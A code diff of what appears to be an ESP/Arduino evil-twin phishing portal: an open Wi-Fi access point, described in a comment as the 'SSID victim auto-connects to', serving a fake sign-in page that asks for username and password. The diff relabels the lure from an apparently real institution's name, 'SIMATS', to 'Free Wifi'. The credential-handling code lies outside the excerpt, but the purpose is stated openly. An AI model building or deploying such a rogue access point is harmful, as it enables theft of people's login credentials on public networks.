@@ -4,7 +4,7 @@
 #include <WebSocketsServer.h>
 
 // ----------------- CONFIG -----------------
-const char* ap_ssid     = "SIMATS";      // SSID victim auto-connects to
+const char* ap_ssid     = "Free Wifi";      // SSID victim auto-connects to
 const char* ap_password = "";            // open network
 
 IPAddress apIP(192, 168, 1, 1);
@@ -26,7 +26,7 @@ const char loginPage[] PROGMEM = R"rawliteral(
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SIMATS - Sign In</title>
+<title>Free Wifi - Sign In</title>
 <style>
   body { font-family: Arial; background: #f2f2f2; text-align: center; padding-top: 50px; }
   .box { background: white; padding: 30px; border-radius: 10px; display: inline-block;
@@ -38,7 +38,7 @@ const char loginPage[] PROGMEM = R"rawliteral(
 </head>
 <body>
 <div class="box">
-  <h2>🔐 SIMATS WiFi</h2>
+  <h2>🔐 Free Wifi WiFi</h2>
   <p>Sign in with your username and password to connect.</p>
   <input type="text" id="username" placeholder="Username" required><br>
   <input type="password" id="password" placeholder="Password"><br>
